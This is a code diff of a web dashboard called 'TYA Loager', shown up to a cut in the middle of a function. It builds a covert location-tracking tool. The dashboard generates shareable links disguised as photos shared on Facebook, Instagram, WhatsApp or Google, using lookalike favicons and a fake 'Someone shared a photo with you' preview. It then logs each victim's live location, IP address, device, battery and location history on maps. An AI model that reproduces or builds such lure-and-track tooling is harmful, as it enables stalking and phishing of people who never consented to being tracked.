-                <p>Upload 4 favicon images: <strong>i.jpg, f.jpg, w.jpg, g.jpg</strong></p>
-                <div style="display:flex;gap:8px;flex-wrap:wrap;">
-                    <label for="fav-i" class="upload-btn" style="background:#8b5cf6;">i</label>
-                    <input type="file" id="fav-i" class="file-input" accept="image/*" />
-                    <label for="fav-f" class="upload-btn" style="background:#f59e0b;">f</label>
-                    <input type="file" id="fav-f" class="file-input" accept="image/*" />
-                    <label for="fav-w" class="upload-btn" style="background:#10b981;">w</label>
-                    <input type="file" id="fav-w" class="file-input" accept="image/*" />
-                    <label for="fav-g" class="upload-btn" style="background:#ef4444;">g</label>
-                    <input type="file" id="fav-g" class="file-input" accept="image/*" />
-                </div>
-                <div class="preview-row">
-                    <span style="font-size:0.8rem;color:var(--text2);">Current:</span>
-                    <div class="favicon-grid" id="favicon-previews">
-                        <img src="/api/favicon/i" alt="i" data-name="i" />
-                        <img src="/api/favicon/f" alt="f" data-name="f" />
-                        <img src="/api/favicon/w" alt="w" data-name="w" />
-                        <img src="/api/favicon/g" alt="g" data-name="g" />
-                    </div>
-                </div>
-            </div>
-        </div>
+  <!-- ═══ HERO ═══ -->
+  <div class="section hero">
+    <div class="hero-badge"><span class="dot"></span> System Active</div>
+    <h1>TYA Loager</h1>
+    <p>Advanced multi-user location intelligence. Generate links, track in real-time, and manage everything from one command center.</p>
+  </div>
 
-        <div class="action-bar">
-            <button onclick="generateLink()" class="btn btn-primary">✨ Generate New Link</button>
-            <button onclick="clearAllData()" class="btn btn-danger">🗑️ Clear All Data</button>
-            <button onclick="refreshDashboard()" class="btn btn-secondary">🔄 Refresh</button>
-        </div>
+  <!-- ═══ STATS ═══ -->
+  <div class="stats">
+    <div class="stat"><div class="stat-num c-accent" id="sTotal">0</div><div class="stat-label">Total Links</div></div>
+    <div class="stat"><div class="stat-num c-green" id="sLive">0</div><div class="stat-label">Live Now</div></div>
+    <div class="stat"><div class="stat-num c-red" id="sOff">0</div><div class="stat-label">Offline</div></div>
+    <div class="stat"><div class="stat-num c-cyan" id="sHits">0</div><div class="stat-label">Total Hits</div></div>
+  </div>
 
-        <div class="grid-container" id="cards-container">
-            <div class="empty-state">
-                <div class="icon">📡</div>
-                <h3>No Active Targets</h3>
-                <p>Upload your images, then click "Generate New Link" to start tracking.</p>
-                <p style="font-size:0.85rem;color:var(--text2);margin-top:8px;">
-                    Each link gets a custom URL (e.g., /facebook) and a favicon.
-                </p>
-            </div>
-        </div>
+  <!-- ═══ SECTION: CREATE NEW LINK ═══ -->
+  <div class="section" style="animation-delay:.12s">
+    <div class="sec-head">
+      <div class="sec-icon">🔗</div>
+      <div><div class="sec-title">Create Tracking Link</div><div class="sec-sub">Generate a new shareable link to start tracking</div></div>
     </div>
-
-    <!-- TRACKER -->
-    <div id="tracker-view">
-        <img id="target-image" src="" alt="Shared Image" />
-        <div class="loader-overlay" id="loader">
-            <div class="spinner"></div>
-            <p>Loading High-Res…</p>
-        </div>
+    <div class="create-form" id="createForm">
+      <div class="form-field">
+        <label>Link Slug</label>
+        <input class="input" id="cSlug" placeholder="e.g. john, photo123" autocomplete="off"/>
+      </div>
+      <div class="form-field">
+        <label>Card Name (Label)</label>
+        <input class="input" id="cName" placeholder="e.g. John's Phone" autocomplete="off"/>
+      </div>
+      <div style="padding-top:18px">
+        <button class="btn btn-primary" onclick="createLink()">➕ Create Link</button>
+      </div>
     </div>
+    <div id="linkResult" style="margin-top:16px;display:none">
+      <div style="display:flex;align-items:center;gap:10px;padding:14px 18px;background:var(--surface);border-radius:var(--radius-xs);border:1px solid var(--border)">
+        <span style="font-size:13px;color:var(--accent3);flex:1;word-break:break-all;font-family:monospace" id="linkUrl"></span>
+        <button class="btn btn-sm btn-ghost" onclick="copyGenLink()">📋 Copy</button>
+      </div>
+    </div>
+  </div>
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
-    </script>
+  <!-- ═══ SECTION: TRACKED USERS ═══ -->
+  <div class="section" style="animation-delay:.2s">
+    <div class="sec-head">
+      <div class="sec-icon">👥</div>
+      <div><div class="sec-title">Tracked Users</div><div class="sec-sub">Each card has its own live map and location history</div></div>
+      <div class="sec-right">
+        <div class="toggle-row">
+          <span style="font-size:12px;color:var(--text3)">Show Archived</span>
+          <button class="toggle" id="archiveToggle" onclick="toggleArchive()"></button>
+        </div>
+      </div>
+    </div>
+    <div class="cards-grid" id="cardsGrid">
+      <div class="empty"><div class="empty-icon">📡</div><p>No tracking links yet. Create one above to get started.</p></div>
+    </div>
+  </div>
 
-    <script>
-        // ─── CONFIG ──────────────────────────────────────────────
-        const FAVICON_NAMES = ['i', 'f', 'w', 'g'];
-        const OFFLINE_THRESHOLD = 30000;
-        const origin = window.location.origin;
+  <!-- ═══ SECTION: SOCIAL IMAGES ═══ -->
+  <div class="section" style="animation-delay:.28s">
+    <div class="sec-head">
+      <div class="sec-icon">🖼️</div>
+      <div><div class="sec-title">Social Preview Images</div><div class="sec-sub">Upload images from your device. Assign them to links for realistic social shares.</div></div>
+    </div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;align-items:start" id="imageLayout">
+      <div>
+        <div class="upload-zone" id="uploadZone" onclick="document.getElementById('imgFileInput').click()">
+          <div class="uz-icon">📤</div>
+          <p><strong>Click to upload</strong> an image from your device</p>
+          <p style="font-size:11px;margin-top:4px">PNG, JPEG up to 10 MB</p>
+        </div>
+        <input type="file" id="imgFileInput" accept="image/*" style="display:none" onchange="uploadImage(this)"/>
+        <div class="form-field" style="margin-top:12px">
+          <label>Image Name</label>
+          <input class="input" id="imgName" placeholder="e.g. sunset, party-pic" autocomplete="off"/>
+        </div>
+        <div class="images-grid" id="imagesGrid" style="margin-top:16px"></div>
+      </div>
+      <div>
+        <div style="font-size:13px;font-weight:600;color:var(--text3);margin-bottom:10px;text-transform:uppercase;letter-spacing:.06em">
+          Facebook Preview Mockup
+        </div>
+        <div class="social-preview" id="socialPreview">
+          <img id="previewImg" src="" alt="Preview"/>
+          <div class="sp-body">
+            <div class="sp-domain" id="previewDomain">YOUR-APP.VERCEL.APP</div>
+            <div class="sp-title">📷 Photo Shared with You</div>
+            <div class="sp-desc">Someone shared a photo with you. Tap to view it now.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  @media(max-width:768px){
+  }
 
-        // ─── ROUTING ──────────────────────────────────────────────
-        const path = window.location.pathname;
-        const isTracker = path.startsWith('/track/');
-        const customPath = isTracker ? decodeURIComponent(path.substring(7)) : null;
+  <!-- ═══ SECTION: FAVICONS ═══ -->
+  <div class="section" style="animation-delay:.36s">
+    <div class="sec-head">
+      <div class="sec-icon">⭐</div>
+      <div><div class="sec-title">Favicon Library</div><div class="sec-sub">Upload custom tab icons. Assign to any link.</div></div>
+    </div>
+    <div class="fav-grid">
+      <div class="fav-slot" onclick="uploadFav('i')">
+        <div class="fav-icon" id="favI" style="background:linear-gradient(135deg,#e1306c,#833ab4);color:#fff">I</div>
+        <div class="fav-label">Instagram</div>
+      </div>
+      <div class="fav-slot" onclick="uploadFav('f')">
+        <div class="fav-icon" id="favF" style="background:linear-gradient(135deg,#1877f2,#0a5dc2);color:#fff">F</div>
+        <div class="fav-label">Facebook</div>
+      </div>
+      <div class="fav-slot" onclick="uploadFav('w')">
+        <div class="fav-icon" id="favW" style="background:linear-gradient(135deg,#25d366,#128c7e);color:#fff">W</div>
+        <div class="fav-label">WhatsApp</div>
+      </div>
+      <div class="fav-slot" onclick="uploadFav('g')">
+        <div class="fav-icon" id="favG" style="background:linear-gradient(135deg,#4285f4,#ea4335);color:#fff">G</div>
+        <div class="fav-label">Google</div>
+      </div>
+    </div>
+    <input type="file" id="favFileInput" accept="image/*" style="display:none"/>
+  </div>
 
-        // Set absolute OG URL for social sharing
-        document.getElementById('og-url').content = window.location.href;
-        document.getElementById('og-image').content = origin + '/api/image';
+</div><!-- .page -->
 
-        if (isTracker && customPath) {
-            initTracker(customPath);
-        } else {
-            initDashboard();
-        }
+<!-- ═══ CREATE MODAL (alt) ═══ -->
+<div class="modal-bg" id="modalBg" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <h2>🔗 New Tracking Link</h2>
+    <div class="form-field">
+      <label>Slug (URL path)</label>
+      <input class="input" id="mSlug" placeholder="e.g. john" autocomplete="off"/>
+    </div>
+    <div class="form-field">
+      <label>Card Name</label>
+      <input class="input" id="mName" placeholder="e.g. John's Phone" autocomplete="off"/>
+    </div>
+    <div class="modal-actions">
+      <button class="btn btn-ghost" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-primary" onclick="createFromModal()">Create</button>
+    </div>
+  </div>
+</div>
 
-        // ─── STATE ────────────────────────────────────────────────
-        let trackedUsers = [];
-        let mapInstances = {};
-        let isEditing = {};
+<!-- FAB -->
+<button class="fab" onclick="openModal()" title="New Link">＋</button>
 
-        // ─── DASHBOARD ────────────────────────────────────────────
-        function initDashboard() {
-            document.getElementById('dashboard-view').style.display = 'block';
-            refreshPreviews();
-            fetchUsers();
-            setInterval(fetchUsers, 5000);
-            setupUploads();
+<script>
+/* ═══════════════════════════════════════════════
+   TYA LOAGER v6 — CLIENT JS
+   ═══════════════════════════════════════════════ */
+const API = window.location.origin;
+let showArchived = false;
+let users = [];
+let cardMaps = {};   // userId -> leaflet map instance
+let cardMarkers = {}; // userId -> leaflet marker
+let cardCircles = {}; // userId -> accuracy circle
+let cardTrails = {};  // userId -> polyline
+let images = [];
 
-            document.addEventListener('focusin', (e) => {
-                if (e.target && e.target.id && e.target.id.startsWith('path-')) {
-                    const id = e.target.id.replace('path-', '');
-                    isEditing[id] = true;
-                }
-            });
-            document.addEventListener('focusout', (e) => {
-                if (e.target && e.target.id && e.target.id.startsWith('path-')) {
-                    const id = e.target.id.replace('path-', '');
-                    isEditing[id] = false;
-                }
-            });
-        }
+/* ── PARTICLES ── */
+(function(){
+  const c = document.getElementById('particles');
+  for(let i=0;i<35;i++){
+    const p=document.createElement('div');p.className='particle';
+    const s=Math.random()*4+2;
+    const colors=['var(--accent)','var(--cyan)','var(--purple)','var(--green)'];
+    p.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}%;
+      animation-duration:${Math.random()*20+15}s;animation-delay:${Math.random()*10}s;
+      background:${colors[Math.floor(Math.random()*colors.length)]}`;
+    c.appendChild(p);
+  }
+})();
 
-        function refreshDashboard() {
-            fetchUsers();
-            refreshPreviews();
-            showToast('🔄 Refreshed');
-        }
+/* ── TOAST ── */
+function toast(msg, icon='✅'){
+  const d=document.createElement('div');d.className='toast';
+  d.innerHTML=`<span>${icon}</span> ${msg}`;
+  document.getElementById('toasts').appendChild(d);
+  setTimeout(()=>d.remove(),3200);
+}
 
-        function refreshPreviews() {
-            document.getElementById('og-preview').src = '/api/image?' + Date.now();
-            FAVICON_NAMES.forEach(name => {
-                const img = document.querySelector(`#favicon-previews img[data-name="${name}"]`);
-                if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
-            });
-        }
+/* ── MODAL ── */
+function openModal(){document.getElementById('modalBg').classList.add('show')}
+function closeModal(){document.getElementById('modalBg').classList.remove('show')}
 
-        // ─── Upload Handlers ──────────────────────────────────────
-        function setupUploads() {
-            document.getElementById('og-upload').addEventListener('change', async function(e) {
-                const file = e.target.files[0];
-                if (!file) return;
-                const ok = await uploadFile('/api/image', file, '✅ OG image uploaded!');
-                if (ok) {
-                    document.getElementById('og-preview').src = '/api/image?' + Date.now();
-                }
-                e.target.value = '';
-            });
+/* ── CREATE LINK ── */
+async function createLink(){
+  const slug=document.getElementById('cSlug').value.trim();
+  const name=document.getElementById('cName').value.trim();
+  if(!slug){toast('Enter a slug','⚠️');return}
+  const res=await fetch(API+'/api/track',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({id:slug,customPath:slug,cardName:name})});
+  const d=await res.json();
+  const url=API+'/track/'+d.customPath;
+  document.getElementById('linkUrl').textContent=url;
+  document.getElementById('linkResult').style.display='block';
+  document.getElementById('cSlug').value='';document.getElementById('cName').value='';
+  toast('Link created!','🔗');
+  fetchUsers();
+}
+async function createFromModal(){
+  const slug=document.getElementById('mSlug').value.trim();
+  const name=document.getElementById('mName').value.trim();
+  if(!slug){toast('Enter a slug','⚠️');return}
+  await fetch(API+'/api/track',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({id:slug,customPath:slug,cardName:name})});
+  closeModal();document.getElementById('mSlug').value='';document.getElementById('mName').value='';
+  toast('Link created!','🔗');fetchUsers();
+}
+function copyGenLink(){
+  navigator.clipboard.writeText(document.getElementById('linkUrl').textContent);
+  toast('Link copied!','📋');
+}
 
-            FAVICON_NAMES.forEach(name => {
-                const input = document.getElementById('fav-' + name);
-                if (input) {
-                    input.addEventListener('change', async function(e) {
-                        const file = e.target.files[0];
-                        if (!file) return;
-                        const ok = await uploadFile('/api/favicon/' + name, file, '✅ Favicon "' +
-                            name + '.jpg" uploaded!');
-                        if (ok) {
-                            const img = document.querySelector(
-                                `#favicon-previews img[data-name="${name}"]`);
-                            if (img) img.src = '/api/favicon/' + name + '?' + Date.now();
-                            fetchUsers();
-                        }
-                        e.target.value = '';
-                    });
-                }
-            });
-        }
+/* ── ARCHIVE ── */
+function toggleArchive(){
+  showArchived=!showArchived;
+  document.getElementById('archiveToggle').classList.toggle('on',showArchived);
+  renderCards();
+}
 
-        async function uploadFile(url, file, successMsg) {
-            const formData = new FormData();
-            formData.append('image', file);
-            try {
-                const res = await fetch(url, { method: 'POST', body: formData });
-                if (!res.ok) {
-                    const text = await res.text();
-                    throw new Error(text || 'Server error');
-                }
-                const data = await res.json();
-                if (data.success) {
-                    showToast(successMsg);
-                    return true;
-                } else {
-                    showToast('❌ Upload failed: ' + (data.error || 'unknown'));
-                    return false;
-                }
-            } catch (err) {
-                console.error('Upload error:', err);
-                showToast('❌ Error: ' + err.message);
-                return false;
-            }
-        }
+/* ── FETCH ── */
+async function fetchUsers(){
+  try{
+    const r=await fetch(API+'/api/track?includeDeleted=true');
+    const d=await r.json();
+    users=Array.isArray(d)?d:[];
+  }catch(e){users=[]}
+  updateStats();
+  renderCards();
+}
+async function fetchImages(){
+  try{
+    const r=await fetch(API+'/api/image?list=true');
+    const d=await r.json();
+    images=Array.isArray(d)?d:[];
+  }catch(e){images=[]}
+  renderImages();
+}
 
-        // ─── Fetch Users ──────────────────────────────────────────
-        async function fetchUsers() {
-            try {
-                const res = await fetch('/api/track');
-                if (!res.ok) throw new Error('API error');
-                const newUsers = await res.json();
-                trackedUsers = newUsers;
-                renderCards();
-            } catch (e) {
-                console.error('Fetch error:', e);
-            }
-        }
+function updateStats(){
+  const active=users.filter(u=>!u.deleted);
+  const now=Date.now();
+  const live=active.filter(u=>(now-u.lastUpdate)<30000);
+  const off=active.length-live.length;
+  const hits=active.reduce((s,u)=>s+(u.hits||0),0);
+  document.getElementById('sTotal').textContent=active.length;
+  document.getElementById('sLive').textContent=live.length;
+  document.getElementById('sOff').textContent=off;
+  document.getElementById('sHits').textContent=hits;
+}
 
-        // ─── Render Cards ─────────────────────────────────────────
-        function renderCards() {
-            const container = document.getElementById('cards-container');
+/* ── TIME FORMAT ── */
+function timeAgo(ts){
+  if(!ts)return'Never';
+  const s=Math.floor((Date.now()-ts)/1000);
+  if(s<10)return'Just now';if(s<60)return s+'s ago';
+  if(s<3600)return Math.floor(s/60)+'m ago';
+  if(s<86400)return Math.floor(s/3600)+'h ago';
+  return new Date(ts).toLocaleDateString();
+}
+function timeStr(ts){
+  if(!ts)return'—';
+  return new Date(ts).toLocaleString(undefined,{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+}
 
-            const inputValues = {};
-            container.querySelectorAll('.card').forEach(card => {
-                const id = card.dataset.userId;
-                if (id) {
-                    const input = card.querySelector('input[id^="path-"]');
-                    if (input && !isEditing[id]) {
-                        inputValues[id] = input.value;
-                    } else if (input && isEditing[id]) {
-                        inputValues[id] = input.value;
-                    }
-                }
-            });
+/* ── RENDER CARDS ── */
+function renderCards(){
+  const grid=document.getElementById('cardsGrid');
+  const list=showArchived?users:users.filter(u=>!u.deleted);
+  
+  if(!list.length){
+    grid.innerHTML='<div class="empty"><div class="empty-icon">📡</div><p>No tracking links yet.</p></div>';
+    return;
+  }
 
-            container.innerHTML = '';
+  // Collect existing edit values to preserve them
+  const editVals={};
+  grid.querySelectorAll('[data-edit-id]').forEach(el=>{
+    editVals[el.dataset.editId]=el.value;
+  });
 
-            if (!trackedUsers || trackedUsers.length === 0) {
-                container.innerHTML = `
-                    <div class="empty-state">
-                        <div class="icon">📡</div>
-                        <h3>No Active Targets</h3>
-                        <p>Upload your images, then click "Generate New Link" to start tracking.</p>
-                    </div>
-                `;
-                return;
-            }
+  const now=Date.now();
+  let html='';
+  list.forEach((u,idx)=>{
+    const isLive=(now-u.lastUpdate)<30000 && !u.deleted;
+    const statusCls=isLive?'live':'offline';
+    const lat=isLive?u.lat:(u.lastLat||u.lat);
+    const lng=isLive?u.lng:(u.lastLng||u.lng);
+    const addr=isLive?(u.address||'Locating...'):(u.lastAddress||u.address||'No location');
+    const batPct=u.battery!=null?u.battery:null;
+    const batColor=batPct>50?'var(--green)':batPct>20?'var(--amber)':'var(--red)';
+    const mapId='map_'+u.id;
+    const cardNameVal=editVals['name_'+u.id]!==undefined?editVals['name_'+u.id]:(u.cardName||'');
+    const slugVal=editVals['slug_'+u.id]!==undefined?editVals['slug_'+u.id]:(u.customPath||u.id);
 
-            const now = Date.now();
-            const sorted = [...trackedUsers].sort((a, b) => {
-                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
-                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
-                if (aLive !== bLive) return bLive - aLive;
-                return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
-            });
+    html+=`<div class="user-card" style="animation-delay:${idx*0.06}s" id="card_${u.id}">
+      <div class="uc-header">
+        <div class="uc-avatar ${statusCls}">
+          ${(u.cardName||u.id).charAt(0).toUpperCase()}
+          ${isLive?'<div class="ring"></div>':''}
+        </div>
+        <div class="uc-meta">
+          <div class="uc-name">
+            ${u.cardName||u.customPath||u.id}
+            <span class="badge ${isLive?'badge-live':'badge-off'}">${isLive?'● LIVE':'● OFFLINE'}</span>
+            ${u.deleted?'<span class="badge badge-off" style="background:rgba(255,255,255,.05);color:var(--text3)">ARCHIVED</span>':''}
+          </div>
+          <div class="uc-id">${u.id} · ${u.hits||0} hits · ${timeAgo(u.lastUpdate)}</div>
+        </div>
+        <div class="uc-actions">
+          <button class="btn btn-icon btn-ghost" onclick="copyLink('${u.customPath||u.id}')" title="Copy link">📋</button>
+          ${u.deleted
+            ?`<button class="btn btn-icon btn-success" onclick="restoreUser('${u.id}')" title="Restore">♻️</button>
+               <button class="btn btn-icon btn-danger" onclick="permDelete('${u.id}')" title="Permanent delete">🗑️</button>`
+            :`<button class="btn btn-icon btn-danger" onclick="archiveUser('${u.id}')" title="Archive">🗑️</button>`}
+        </div>
+      </div>
 
-            sorted.forEach(user => {
-                const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() <
-                    OFFLINE_THRESHOLD));
-                const displayLat = isLive ? user.lat : (user.lastLat || null);
-                const displayLng = isLive ? user.lng : (user.lastLng || null);
-                const hasLocation = !!(displayLat && displayLng);
-                const mapUrl = hasLocation ? `https://www.google.com/maps?q=${displayLat},${displayLng}` : '#';
-                const faviconName = user.favicon || 'i';
-                const customPath = user.customPath || user.id;
+      <!-- INDIVIDUAL MAP -->
+      <div class="uc-map">
+        <div class="map-label">📍 ${isLive?'Live Location':'Last Known Location'}</div>
+        <div class="map-open">
+          ${lat!=null?`<a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" class="btn btn-sm btn-ghost" style="font-size:11px">🗺️ Google Maps</a>`:''}
+        </div>
+        <div id="${mapId}" style="width:100%;height:100%"></div>
+      </div>
 
-                const card = document.createElement('div');
-                card.className = 'card';
-                card.dataset.userId = user.id;
-                card.id = 'card-' + user.id;
-                card.innerHTML = `
-                    <div class="card-header">
-                        <span class="user-id">${escapeHtml(user.id)}</span>
-                        <div style="display:flex;align-items:center;gap:10px;">
-                            <span class="favicon-badge">
-                                <img src="/api/favicon/${faviconName}" alt="favicon" />
-                            </span>
-                            <span class="status-badge ${isLive ? '' : 'offline'}">
-                                <div class="status-dot"></div>
-                                ${isLive ? 'LIVE' : 'OFFLINE'}
-                            </span>
-                        </div>
-                    </div>
+      <div class="uc-body">
+        <div class="uc-info">
+          <div class="uc-info-item"><span class="label">📍 Address</span><span class="value addr">${addr}</span></div>
+          <div class="uc-info-item"><span class="label">📱 Device</span><span class="value">${u.device||'Unknown'}</span></div>
+          <div class="uc-info-item"><span class="label">🌐 IP</span><span class="value">${u.ip||'—'}</span></div>
+          <div class="uc-info-item"><span class="label">📡 Source</span><span class="value">${u.source||'—'}</span></div>
+          <div class="uc-info-item"><span class="label">🎯 Accuracy</span><span class="value">${u.accuracy!=null?(u.accuracy>1000?(u.accuracy/1000).toFixed(1)+' km':Math.round(u.accuracy)+' m'):'—'}</span></div>
+          <div class="uc-info-item"><span class="label">⏱️ Last Update</span><span class="value">${timeStr(u.lastUpdate)}</span></div>
+        </div>
+        ${batPct!=null?`<div class="uc-battery">
+          <span style="font-size:14px">🔋</span>
+          <div class="bat-bar"><div class="bat-fill" style="width:${batPct}%;background:${batColor}"></div></div>
+          <span class="bat-text" style="color:${batColor}">${batPct}%</span>
+        </div>`:''}
+      </div>
 
-                    <div class="info-grid">
-                        <div class="info-item">
-                            <div class="info-label">Device</div>
-                            <div class="info-value">${escapeHtml(user.device || 'Unknown')}</div>
-                        </div>
-                        <div class="info-item">
-                            <div class="info-label">Battery</div>
-                            <div class="info-value">${escapeHtml(user.battery || 'N/A')}</div>
-                        </div>
-                        <div class="info-item" style="grid-column:1/-1;">
-                            <div class="info-label">Last Update</div>
-                            <div class="info-value">${user.lastUpdate ? new Date(user.lastUpdate).toLocaleString() : 'Never'}</div>
-                        </div>
-                        ${hasLocation ? `
-                        <div class="info-item" style="grid-column:1/-1;">
-                            <div class="info-label">${isLive ? 'Current Location' : 'Last Known Location'}</div>
-                            <div class="info-value">${displayLat.toFixed(5)}, ${displayLng.toFixed(5)}</div>
-                        </div>
-                        ` : ''}
-                    </div>
+      <!-- EDIT ROW -->
+      <div class="uc-edit">
+        <input class="input" data-edit-id="name_${u.id}" value="${cardNameVal}" placeholder="Card name"/>
+        <input class="input" data-edit-id="slug_${u.id}" value="${slugVal}" placeholder="URL slug"/>
+        <select data-edit-id="img_${u.id}" onchange="saveUserField('${u.id}','imageName',this.value)">
+          <option value="">Default Image</option>
+          ${images.map(im=>`<option value="${im.name}" ${u.imageName===im.name?'selected':''}>${im.name}</option>`).join('')}
+        </select>
+        <button class="btn btn-sm btn-primary" onclick="saveUserEdits('${u.id}')">💾 Save</button>
+      </div>
 
-                    <div class="map-container" id="map-${user.id}"></div>
+      <!-- HISTORY -->
+      ${(u.locationHistory&&u.locationHistory.length)?`
+      <details class="uc-history">
+        <summary>📜 Location History (${u.locationHistory.length})</summary>
+        <div class="history-list">
+          ${u.locationHistory.slice().reverse().map(h=>`
+            <div class="history-item" onclick="flyCardMap('${u.id}',${h.lat},${h.lng})">
+              <span class="hi-dot ${h.type==='online'?'on':'off'}"></span>
+              <span class="hi-addr">${h.address||h.lat.toFixed(4)+', '+h.lng.toFixed(4)}</span>
+              <span class="hi-time">${timeStr(h.time)}</span>
+            </div>`).join('')}
+        </div>
+      </details>`:''}
+    </div>`;
+  });
+  grid.innerHTML=html;
 
-                    <div class="settings-row">
-                        <label>
-                            Custom URL
-                            <input type="text" id="path-${user.id}" value="${escapeHtml(customPath)}" 
-                                   placeholder="custom-slug" />
-                        </label>
-                        <label>
-                            Favicon
-                            <div class="favicon-select" id="fav-select-${user.id}">
-                                ${FAVICON_NAMES.map(name => `
-                                    <img src="/api/favicon/${name}" data-name="${name}" 
-                                         class="${name === faviconName ? 'active' : ''}" 
-                                         onclick="selectFavicon('${user.id}', '${name}')" />
-                                `).join('')}
-                            </div>
-                        </label>
-                    </div>
+  // Initialize individual maps after DOM is set
+  requestAnimationFrame(()=>{
+    list.forEach(u=>{
+      const mapId='map_'+u.id;
+      const el=document.getElementById(mapId);
+      if(!el)return;
+      const isLive=(now-u.lastUpdate)<30000 && !u.deleted;
+      const lat=isLive?u.lat:(u.lastLat||u.lat);
+      const lng=isLive?u.lng:(u.lastLng||u.lng);
+      initCardMap(u.id,mapId,lat,lng,isLive,u);
+    });
+  });
+}
 
-                    <div class="btn-group">
-                        <button class="btn btn-success" onclick="saveSettings('${user.id}')">💾 Save</button>
-                        <button class="btn btn-primary" onclick="copyLink('${user.id}')">📋 Copy Link</button>
-                        <a href="${mapUrl}" target="_blank" class="btn btn-secondary ${hasLocation ? '' : 'disabled'}"
-                           style="${hasLocation ? '' : 'opacity:0.5;pointer-events:none;'}">
-                            🗺️ Maps
-                        </a>
-                        <button class="btn btn-danger" onclick="deleteUser('${user.id}')">✕</button>
-                    </div>
-                `;
+/* ── CARD MAP ── */
+function initCardMap(userId,mapId,lat,lng,isLive,user){
+  const el=document.getElementById(mapId);
+  if(!el||!window.L)return;
 
-                container.appendChild(card);
+  // Destroy old map if exists
+  if(cardMaps[userId]){
+    try{cardMaps[userId].remove()}catch(e){}
+  }
 
-                if (inputValues[user.id] !== undefined) {
-                    const input = card.querySelector('input[id^="path-"]');
-                    if (input) {
-                        input.value = inputValues[user.id];
-                    }
-                }
+  const hasLoc=lat!=null&&lng!=null;
+  const center=hasLoc?[lat,lng]:[27.7,85.3];
+  const zoom=hasLoc?15:3;
 
-                setTimeout(() => {
-                    if (hasLocation) {
-                        const mapId = 'map-' + user.id;
-                        const mapEl = document.getElementById(mapId);
-                        if (!mapEl) return;
-                        if (mapInstances[mapId]) {
-                            mapInstances[mapId].remove();
-                            delete mapInstances[mapId];
-                        }
-                        const map = L.map(mapId, {
-                            zoomControl: false,
-                            attributionControl: false,
-                            center: [displayLat, displayLng],
-                            zoom: 14,
-                        });
-                        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                            maxZoom: 19
-                        }).addTo(map);
-                        L.marker([displayLat, displayLng]).addTo(map)
-                            .bindPopup(`<b>${escapeHtml(user.id)}</b><br>Battery: ${escapeHtml(user.battery || 'N/A')}<br>${isLive ? '🟢 Online' : '🔴 Offline'}`);
-                        mapInstances[mapId] = map;
-                        setTimeout(() => map.invalidateSize(), 200);
-                    }
-                }, 200);
-            });
-        }
+  const map=L.map(el,{zoomControl:false,attributionControl:false}).setView(center,zoom);
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{maxZoom:19}).addTo(map);
+  cardMaps[userId]=map;
 
-        // ─── Favicon Selection ────────────────────────────────────
-        function selectFavicon(userId, name) {
-            const container = document.getElementById('fav-select-' + userId);
-            if (!container) return;
-            container.querySelectorAll('img').forEach(img => {
-                img.classList.toggle('active', img.dataset.name === name);
-            });
-            const card = document.getElementById('card-' + userId);
-            if (card) {
-                const badge = card.querySelector('.favicon-badge img');
-                if (badge) badge.src = '/api/favicon/' + name + '?' + Date.now();
-            }
-            saveSettings(userId);
-        }
+  if(hasLoc){
+    const color=isLive?'#22c55e':'#ef4444';
+    const marker=L.circleMarker([lat,lng],{
+      radius:10,fillColor:color,fillOpacity:.9,color:'#fff',weight:2,opacity:.8
+    }).addTo(map);
+    
+    const label=user.cardName||user.customPath||user.id;
+    marker.bindPopup(`<div style="font-size:13px;font-weight:600">${label}</div>
+      <div style="font-size:11px;color:#666">${isLive?'Live':'Last known'}</div>
+      <div style="font-size:12px;margin-top:4px">${user.address||user.lastAddress||''}</div>`);
+    cardMarkers[userId]=marker;
 
-        // ─── Save Settings ────────────────────────────────────────
-        async function saveSettings(userId) {
-            const pathInput = document.getElementById('path-' + userId);
-            const customPath = pathInput ? pathInput.value.trim() : userId;
+    // Accuracy circle
+    if(user.accuracy){
+      cardCircles[userId]=L.circle([lat,lng],{radius:user.accuracy,fillColor:color,fillOpacity:.08,
+        color:color,weight:1,opacity:.3}).addTo(map);
+    }
 
-            const container = document.getElementById('fav-select-' + userId);
-            let favicon = 'i';
-            if (container) {
-                const active = container.querySelector('img.active');
-                if (active) favicon = active.dataset.name;
-            }
-
-            try {
-                const res = await fetch('/api/track/' + userId, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ customPath, favicon }),
-                });
-                if (!res.ok) {
-                    const text = await res.text();
-                    throw new Error(text || 'Server error');
-                }
-                const data = await res.json();
-                if (data.success) {
-                    showToast('✅ Settings saved for ' + escapeHtml(userId));
-                    const card = document.getElementById('card-' + userId);
-                    if (card) {
-                        const badge = card.querySelector('.favicon-badge img');
-                        if (badge) badge.src = '/api/favicon/' + favicon + '?' + Date.now();
-                    }
-                    fetchUsers();
-                } else {
-                    showToast('❌ Failed to save: ' + (data.error || 'unknown'));
-                }
-            } catch (err) {
-                console.error('Save error:', err);
-                showToast('❌ Error: ' + err.message);
-            }
-        }
-
-        // ─── Generate Link ────────────────────────────────────────
-        function generateLink() {
-            const id = 'USER' + String(Math.floor(1000 + Math.random() * 9000));
-            fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id, device: 'Pending', battery: 'N/A', lat: null, lng: null }),
-            }).then(() => {
-                fetchUsers();
-                showToast('✨ New link generated: <strong>' + id + '</strong>');
-                copyLink(id);
